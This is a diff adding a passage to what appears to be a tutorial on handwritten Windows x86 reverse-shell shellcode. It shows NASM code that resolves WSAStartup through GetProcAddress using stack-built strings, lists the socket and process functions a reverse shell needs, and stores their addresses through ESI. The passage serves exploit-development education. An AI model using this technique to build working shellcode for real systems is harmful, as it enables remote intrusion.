@@ -239,5 +239,34 @@ Now is a good time to do a register check, here is what our registers look like 
 ; EDI = GetProcAddress address
 ```
 
+Now it's time to go hunting the functions we need: 
++ `WSAStartup`
++ `WSASocketA`
++ `connect`
++ `CreateProcessA`
++ `ExitProcess`
 
+```nasm
+; use GetProcAddress to get location of WSAStartup function
+push 0x61617075
+sub word [esp + 0x2], 0x6161
+push 0x74726174
+push 0x53415357
+push esp
+push eax
+call edi
+```
+
+Same type of operation as before, but just make sure to note that `push eax` is used here to reference the location of `ws2_32.dll` instead of `kernel32.dll` like we're used to. 
+
+Here's where things get awesome. Because the functions we want to use require using the registers we need to keep the location of the DLLs safe, we have to get creative here. We're going to get the address of all the functions we need first, and then call them later. We're going to make ESI effectively a stack pointer, and then keep saving addresses in 4 byte chunks one on top of the other on the stack. This way, all of the function addresses will be safe on the stack and not overwritten by our functions. 
+
+Right now, `WSAStartup` is stored in EAX, so let's put that into ESI and make ESI the location of where ESP is.
+
+```nasm
+push eax
+lea esi, [esp]                          ; esi will store WSAStartup location, and we'll calculate offsets from here
+```
+
+So we pushed EAX onto the stack, therefore ESP was pointing at EAX. Then we put the address of ESP into ESI. So now we can refer to ESI and its offsets we create later to make the function calls. 
 
